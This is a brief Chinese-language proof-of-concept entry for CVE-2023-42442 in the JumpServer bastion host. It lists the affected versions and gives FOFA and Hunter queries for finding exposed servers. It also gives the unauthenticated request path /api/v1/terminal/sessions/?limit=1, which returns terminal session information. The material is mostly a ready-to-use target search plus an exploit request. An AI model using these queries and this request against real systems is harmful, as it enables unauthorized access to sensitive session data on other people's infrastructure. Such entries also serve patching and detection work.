## CVE-2023-42442

## 影响版本
3.0.0 <= JumpServer <= 3.5.4

3.6.0 <= JumpServer <= 3.6.3

## fofa
```
icon_hash="-1162630024"
```

## Hunter
```
app.name="JumpServer"
```
## POC

JumpServer 是一款开源的堡垒机。 在JumpServer受影响版本中，由于/api/v1/terminal/sessions/接口没有添加权限认证，未授权的攻击者可以通过访问/api/v1/terminal/sessions/?limit=1，获取堡垒机terminal的session信息
```
/api/v1/terminal/sessions/?limit=1
```
